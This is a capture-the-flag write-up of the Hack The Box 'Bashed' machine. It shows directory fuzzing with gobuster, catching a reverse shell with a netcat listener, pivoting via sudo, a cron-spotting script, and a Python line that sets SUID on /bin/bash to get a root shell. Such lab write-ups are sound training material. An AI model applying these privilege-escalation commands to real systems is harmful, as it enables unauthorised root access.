---
layout: single
title: Bashed - Hack The Box
excerpt: "Bashed is a fairly easy machine which focuses mainly on fuzzing and locating important files. As basic access to the crontab is restricted."
date: 2025-05-07
classes: wide
header:
  teaser: /img2/bashed.png
  teaser_home_page: true
  icon: /img2/images/hackthebox.webp
categories:
  - hackthebox
  - Linux
  - Easy
tags:
  - Web Enumeration
  - Abusing WebShell Utility (RCE)
  - Abusing Sudoers Privilege (User Pivoting)
  - Detecting Cron Jobs Running on the System
  - Exploiting Cron Job Through File Manipulation in Python Executed by Root [Privilege Escalation]
---


## Reconnaissance

- Gobuster

```bash
gobuster dir -u http://10.10.10.68/ -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -t 20
```

![](/img2/Pasted%20image%2020250507130753.png)

![](/img2/Pasted%20image%2020250507133336.png)

## Exploitation

- Send reverse shell

![](/img2/Pasted%20image%2020250507133521.png)

```bash
nc -nlvp 9000
```

## Post-exploitation

- List sudoers

```bash 
sudo -l
```

![](/img2/Pasted%20image%2020250507133654.png)

> We can execute commands with scriptmanager user

- User Pivoting

```bash
sudo -u scriptmanager bash
```

- Find scriptmanager files

```bash
find / -user scriptmanager 2>/dev/null | grep -vE "proc"
```

![](/img2/Pasted%20image%2020250507134938.png)

- FInd crontabs with bash script

```bash
#!/bin/bash

old_process=$(ps -eo user,command)

echo -e "[+] Listing new commands...\n\n"
while true;do
        new_process=$(ps -eo user,command)
        diff <(echo "$old_process") <(echo "$new_process") | grep "[\>\<]" | grep -vE "procmon|kworker"
        old_process=$new_process
done
```

![](/img2/Pasted%20image%2020250507144641.png)

- Change test.py script

```python
import os
os.system("chmod u+s /bin/bash")
```

```bash
ls -l /bin/bash
```

![](/img2/Pasted%20image%2020250507144930.png)

```bash
bash -p
cat /root/root.txt
```

![](/img2/Pasted%20image%2020250507145105.png)